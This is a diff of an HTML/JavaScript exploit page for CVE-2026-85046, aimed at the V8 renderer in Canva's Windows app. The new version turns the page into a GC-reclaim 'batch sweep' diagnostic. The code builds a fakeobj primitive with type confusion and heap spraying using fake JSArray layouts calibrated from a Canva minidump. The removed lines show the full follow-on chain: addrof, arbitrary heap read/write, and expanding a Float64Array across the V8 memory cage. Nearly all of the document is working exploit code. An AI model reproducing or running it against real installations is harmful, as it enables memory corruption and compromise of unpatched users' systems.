@@ -1,7 +1,7 @@
 <!doctype html>
 <html>
   <head>
-    <title>CVE-2026-85046 - Canva Windows exact-reference reclaim diagnostic v20</title>
+    <title>CVE-2026-85046 - Canva Windows reclaim batch sweep v21</title>
     <meta charset="UTF-8" />
     <style>
       * {
@@ -177,13 +177,45 @@
 
       var running = false;
 
+      var V21_BATCH_SWEEP = [1, 2, 4, 8, 16];
+
+      function getV21SweepIndex() {
+        var raw = null;
+        try { raw = localStorage.getItem("f022-v21-sweep-index"); } catch (_) {}
+        var idx = Number(raw);
+        if (!Number.isInteger(idx) || idx < 0) idx = 0;
+        return idx;
+      }
+
+      function setV21SweepIndex(idx) {
+        try { localStorage.setItem("f022-v21-sweep-index", String(idx)); } catch (_) {}
+      }
+
+      function resetV21Sweep() {
+        setV21SweepIndex(0);
+        log("[v21] sweep reset; next fresh renderer will use 1 batch/stage");
+      }
+
       try {
-        var previousDiagnostic = localStorage.getItem("f022-v20-last");
+        var previousDiagnostic = localStorage.getItem("f022-v21-last");
         if (previousDiagnostic) {
           setTimeout(function () {
             log("[previous diagnostic] " + previousDiagnostic);
           }, 10);
         }
+
+        var sweepIdxPreview = getV21SweepIndex();
+        setTimeout(function () {
+          if (sweepIdxPreview < V21_BATCH_SWEEP.length) {
+            log(
+              "[v21] next fresh-renderer test: " +
+                V21_BATCH_SWEEP[sweepIdxPreview] +
+                " batch(es)/stage",
+            );
+          } else {
+            log("[v21] sweep complete. Call resetV21Sweep() in DevTools to restart.");
+          }
+        }, 15);
       } catch (_) {}
 
       function handleClick() {
@@ -360,7 +392,7 @@
       // Stack/param locals are PINNED by conservative stack scanning instead.
       // ---------------------------------------------------------------------------
 
-      function attempt_fakeobj() {
+      function attempt_fakeobj(stageBatches) {
         // victim: real double array; the fake "master" will alias its header
         var victim = [1.22, 1.33, 1.44];
 
@@ -420,15 +452,16 @@
             hex(victim_base),
         );
 
-        // Exact public-reference reclaim schedule:
-        //   spray #1 -> pressure toward post-bug Scavenge #1
-        //   spray #2 -> pressure toward post-bug Scavenge #2
-        //   spray #3 -> fill the re-active stale semispace with fake layouts
-        //
-        // One batch is exactly four near-max regular FixedDoubleArray backing
-        // stores (~0x80000 / 512 KiB total). Do not multiply this by 16 here:
-        // the reference exploit intentionally uses only one batch per phase.
-        var stageBatches = 1; // EXACT reference geometry: 4 arrays ~= 512 KiB per stage.
+        // Scavenges: young {x:420} dies untraced, semispaces flip, then the
+        // stale address's semispace becomes allocatable and gets sprayed over.
+        // 64 rounds x 4 x 128KB = 32MB — enough to flip an 8MB semispace pair
+        // and re-cover the dead address even at a deep offset.
+        // Keep approximately the same ~8 MiB per stage as v8-v11, but make
+        // the allocation geometry match the public reference exploit: direct
+        // new Array(...).fill(...) backing stores, alternating 0x3fff/0x3ffb,
+        // and no retained slice copies.
+        if (!Number.isInteger(stageBatches) || stageBatches < 1)
+          throw new Error("invalid v21 stageBatches=" + stageBatches);
 
         var STAGE1_LEN_SMI = 30 << 1;
         var STAGE2_LEN_SMI = 31 << 1;
@@ -436,7 +469,7 @@
 
         try {
           localStorage.setItem(
-            "f022-v20-last",
+            "f022-v21-last",
             JSON.stringify({
               dead_addr: hex(dead_addr),
               victim: hex(victim_base),
@@ -444,8 +477,8 @@
               selectedPattern: pattern,
               windowsPhaseFlip: true,
               stageBatches: stageBatches,
-              stageApproxKiB: 512,
-              totalApproxKiB: 1536,
+              approxKiBPerStage: stageBatches * 512,
+              approxKiBTotal: stageBatches * 512 * 3,
               stage1Length: 30,
               stage2Length: 31,
               stage3Length: 32,
@@ -456,7 +489,7 @@
           );
         } catch (_) {}
 
-        dbg("      [6.1] exact-reference spray stage 1: marker length=30 (~512 KiB)...");
+        dbg("      [6.1] sweep stage 1: marker=30 batches=" + stageBatches + " (~" + (stageBatches * 512) + " KiB)...");
         sprayReferenceStage(
           victim_elems_tagged,
           pattern,
@@ -464,7 +497,7 @@
           STAGE1_LEN_SMI,
         );
 
-        dbg("      [6.2] exact-reference spray stage 2: marker length=31 (~512 KiB)...");
+        dbg("      [6.2] sweep stage 2: marker=31 batches=" + stageBatches + " (~" + (stageBatches * 512) + " KiB)...");
         sprayReferenceStage(
           victim_elems_tagged,
           pattern,
@@ -472,7 +505,7 @@
           STAGE2_LEN_SMI,
         );
 
-        dbg("      [6.3] exact-reference spray stage 3: marker length=32 (~512 KiB)...");
+        dbg("      [6.3] sweep stage 3: marker=32 batches=" + stageBatches + " (~" + (stageBatches * 512) + " KiB)...");
         sprayReferenceStage(
           victim_elems_tagged,
           pattern,
@@ -529,39 +562,38 @@
         var len = master.length;
         dbg("      [7.2] master.length=" + len);
 
-        if (len === 30) {
-          throw new Error(
-            "fake JSArray landed from stage 1; GC phase sizing is too large/early",
-          );
-        }
+        var stage = 0;
+        if (len === 30) stage = 1;
+        else if (len === 31) stage = 2;
+        else if (len === 32) stage = 3;
 
-        if (len === 31) {
-          throw new Error(
-            "fake JSArray landed from stage 2; final-stage sizing/timing needs adjustment",
-          );
-        }
-
-        if (len !== 32)
-          throw new Error(
-            "stale object was not reclaimed as the intended stage-3 fake JSArray " +
-              "(master.length=" +
+        if (stage) {
+          dbg(
+            "      [7.3] fake JSArray marker landed from stage " +
+              stage +
+              " (length=" +
               len +
               ")",
           );
+        } else {
+          dbg("      [7.3] no known stage marker landed");
+        }
 
-        dbg("      [7.3] stage-3 fake JSArray landing confirmed (length=32)");
-        if (f2w0(master[0]) !== PACKED_DOUBLE_MAP)
-          throw new Error("map word mismatch");
-        if (f2w1(master[0]) !== EMPTY_PROPERTIES)
-          throw new Error("properties word mismatch");
-        if (f2w1(master[1]) !== 6)
-          throw new Error("victim.length word mismatch");
+        // Diagnostic-only: do not mutate any victim/master header.
+        // Drop fragile references before returning to logging/allocation-heavy code.
+        master = null;
+        bad = null;
+        victim = null;
 
-        var victim_orig_elems = f2w0(master[1]); // victim's REAL elements pointer (for restore)
+        return {
+          dead_addr: dead_addr,
+          victim_base: victim_base,
+          masterType: masterType,
+          length: len,
+          landedStage: stage,
+          stageBatches: stageBatches,
+        };
 
-        // Plain array — the caller unpacks into locals and drops it immediately,
-        // so no field of this object is reachable from any heap root afterwards.
-        return [master, victim, victim_base, victim_orig_elems, dead_addr];
       }
 
       // ---------------------------------------------------------------------------
@@ -626,7 +658,6 @@
         log("Canva/Windows maps: PACKED_DOUBLE=" + hex(PACKED_DOUBLE_MAP) +
             " PACKED_ELEMENTS=" + hex(PACKED_ELEMENTS_MAP));
         log("Map calibration: decoded from Canva 1.125.1 minidump (ElementsKind 4/2).");
-        log("Reclaim schedule: EXACT reference geometry — 1 batch/stage, ~512 KiB each.");
         if (majorVer >= 152) {
           log(
             "WARNING: version >= 152 is PATCHED (sort no longer inlined on mixed kinds).",
@@ -707,129 +738,68 @@
           );
         }
 
-        // ================= Step 3: fakeobj =================
+        // ================= Step 3: reclaim batch sweep =================
         log("");
-        log(
-          "[*] Step 3: fakeobj — write-barrier skip + GC reclaim (may take a few seconds)...",
-        );
+        log("[*] Step 3: fakeobj reclaim batch sweep...");
 
-        // Pre-create every demo target BEFORE the reclaim: after `master` exists,
-        // each sprayed array is unreferenced garbage, so we keep the post-reclaim
-        // window nearly allocation-free to avoid a scavenge recycling it.
-        var scratch = [1.1, 2.2, 3.3]; // owned write-proof target
-        var rw = new Float64Array(8);
-        var box = [{}, {}];
-
-        var master = null,
-          victim = null,
-          victim_base = 0,
-          victim_orig_elems = 0,
-          master_addr = 0;
-        var attempts = 0,
-          maxAttempts = 1;
-        while (!master && attempts < maxAttempts) {
-          attempts++;
-          window.f022SprayAttempt = attempts;
-          log(
-            "    Attempt " +
-              attempts +
-              "/" +
-              maxAttempts +
-              ": promote -> confuse -> unshift -> spray...",
-          );
-          try {
-            var st = attempt_fakeobj();
-            master = st[0];
-            victim = st[1];
-            victim_base = st[2];
-            victim_orig_elems = st[3];
-            master_addr = st[4];
-            st = null; // drop the carrier array — master now lives only in locals
-          } catch (e) {
-            log("      failed: " + e.message);
-            master = null;
-          }
-        }
-        if (!master) {
-          log("");
-          log(
-            "[!] fakeobj reclaim did not land after " +
-              maxAttempts +
-              " attempts.",
-          );
-          log("    Exact-reference reclaim missed on this fresh renderer; do not rerun in the same renderer.");
+        var sweepIndex = getV21SweepIndex();
+        if (sweepIndex >= V21_BATCH_SWEEP.length) {
+          log("[v21] sweep complete: 1,2,4,8,16 were already scheduled.");
+          log("[v21] Call resetV21Sweep() in DevTools if you want to repeat.");
           return;
         }
-        // Allocation-minimal owned-memory proof. Do not log or allocate between
-        // obtaining the fake object and restoring the victim header.
-        master[0] = w2f(PACKED_ELEMENTS_MAP, EMPTY_PROPERTIES);
-        victim[0] = scratch;
-        master[0] = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES);
-        var scratch_tagged = f2w0(victim[0]);
-        victim[0] = 1.22;
 
-        master[1] = w2f((((scratch_tagged - 1) >>> 0) | 1) >>> 0, FAKE_LEN_SMI);
-        var scratch_header = victim[0];
-        var scratch_elements = f2w0(scratch_header);
-        var observed_length_word = f2w1(scratch_header);
+        var selectedBatches = V21_BATCH_SWEEP[sweepIndex];
 
-        master[1] = w2f(scratch_elements, FAKE_LEN_SMI);
-        victim[0] = 13.37;
-        var write_proof_ok = scratch[0] === 13.37;
+        // Advance BEFORE the fragile dereference. If this renderer crashes, the
+        // next Canva restart automatically moves to the next batch size.
+        setV21SweepIndex(sweepIndex + 1);
 
-        master[1] = w2f(victim_orig_elems, 6);
-        var rw_tagged = addr_of(master, victim, rw);
-        var rw_address = untag(rw_tagged);
-        var rw_backing_pair = heap_read_w01(master, victim, rw_address + 56);
-        var rw_backing_high = rw_backing_pair[1];
-        master[1] = w2f(victim_orig_elems, 6);
-        var box_tagged = addr_of(master, victim, box);
-        var box_header = heap_read_w01(master, victim, untag(box_tagged) + 8);
-        var box_elements = box_header[0];
+        log(
+          "    Sweep " +
+            (sweepIndex + 1) +
+            "/" +
+            V21_BATCH_SWEEP.length +
+            ": " +
+            selectedBatches +
+            " batch(es)/stage (~" +
+            (selectedBatches * 512) +
+            " KiB/stage)",
+        );
+        log("    Next fresh renderer is pre-armed for the following sweep value.");
 
-        // Expand only the owned Float64Array to cover the V8 cage. The high word
-        // of its existing sandboxed backing pointer is retained.
-        heap_write_ww(master, victim, rw_address + 32, 0, 0x20000000);
-        heap_write_ww(master, victim, rw_address + 48, 0x04000000, 0);
-        heap_write_ww(master, victim, rw_address + 56, 0, rw_backing_high);
+        var result = attempt_fakeobj(selectedBatches);
 
-        restore_victim(master, victim, victim_orig_elems);
+        var outcome =
+          result.landedStage === 3
+            ? "stage3-fakeobj-landing-confirmed"
+            : result.landedStage === 2
+              ? "stage2-fakeobj-landing"
+              : result.landedStage === 1
+                ? "stage1-fakeobj-landing"
+                : "fakeobj-marker-missed";
 
-        cage_rw = rw;
-        object_box = box;
-        box_slot = untag(box_elements) + 8;
-        proof_obj = scratch;
-
-        var scratch_data = untag(scratch_elements) + 8;
-        var saved_low = cageRead32(scratch_data);
-        var saved_high = cageRead32(scratch_data + 4);
-        cageWrite32(scratch_data, f2w0(42.42));
-        cageWrite32(scratch_data + 4, f2w1(42.42));
-        var full_cage_write_ok = scratch[0] === 42.42;
-        cageWrite32(scratch_data, saved_low);
-        cageWrite32(scratch_data + 4, saved_high);
-        var restored = scratch[0] === 13.37;
-
-        var bounded = {
-          outcome:
-            write_proof_ok && full_cage_write_ok && restored
-              ? "full-cage-rw-confirmed"
-              : "full-cage-rw-failed",
-          addrof: looksLikeAddresses,
-          fakeobj: true,
-          scratchTagged: hex(scratch_tagged),
-          scratchElements: hex(scratch_elements),
-          scratchLengthWord: observed_length_word,
-          scratchValueAfter: scratch[0],
-          fullCageWriteObserved: full_cage_write_ok,
-          fullCageWriteRestored: restored,
-          ownedMemoryOnly: true,
-          externalNetworkUsed: false,
+        var out = {
+          outcome: outcome,
+          sweepIndex: sweepIndex,
+          stageBatches: selectedBatches,
+          approxKiBPerStage: selectedBatches * 512,
+          deadAddr: hex(result.dead_addr),
+          victim: hex(result.victim_base),
+          masterType: result.masterType,
+          observedLength: result.length,
+          landedStage: result.landedStage,
+          diagnosticOnly: true,
+          headerWriteAttempted: false,
+          fullCageExpansionAttempted: false,
           nativeCodeExecutionAttempted: false,
           sandboxEscapeAttempted: false,
         };
-        window.probeResult = bounded;
-        document.getElementById("output").textContent = JSON.stringify(bounded);
+
+        window.probeResult = out;
+        document.getElementById("output").textContent +=
+          "\n\n" + JSON.stringify(out);
+
       }
 
       function log(msg) {
